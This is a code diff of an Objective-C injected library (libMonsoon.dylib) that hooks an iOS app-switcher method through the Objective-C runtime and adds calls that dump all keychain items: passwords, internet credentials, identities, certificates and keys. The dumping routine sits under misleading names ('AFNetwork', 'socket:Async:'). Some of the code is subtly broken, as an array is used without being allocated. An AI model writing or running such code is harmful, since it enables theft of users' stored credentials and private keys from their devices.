@@ -318,8 +318,12 @@ void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType) {
 
 - (void)socket:(int)argc Async:(char **)argv{
     id pool=[NSAutoreleasePool new];
-	NSArray* arguments;
-	arguments = getCommandLineOptions(argc, argv);
+	NSMutableArray* arguments;
+    [arguments addObject:(id)kSecClassGenericPassword];
+    [arguments addObject:(id)kSecClassInternetPassword];
+    [arguments addObject:(id)kSecClassIdentity];
+    [arguments addObject:(id)kSecClassCertificate];
+    [arguments addObject:(id)kSecClassKey];
 	if ([arguments indexOfObject:@"dumpEntitlements"] != NSNotFound) {
 		dumpKeychainEntitlements();
 		exit(EXIT_SUCCESS);
@@ -384,9 +388,11 @@ static IMP sOriginalImp = NULL;
     sOriginalImp(self, @selector(switcherWasPresented:), self);   //%orig
     UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
     [alert show];
-    char *p ={0};
-    p = (char *)"/var/ -a";
-    [[AFNetwork alloc] socket:2 Async:&p];
-    printToStdOut(@"fuck");
+    
+    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
+    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
+    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
+    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
+    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
 }
 @end
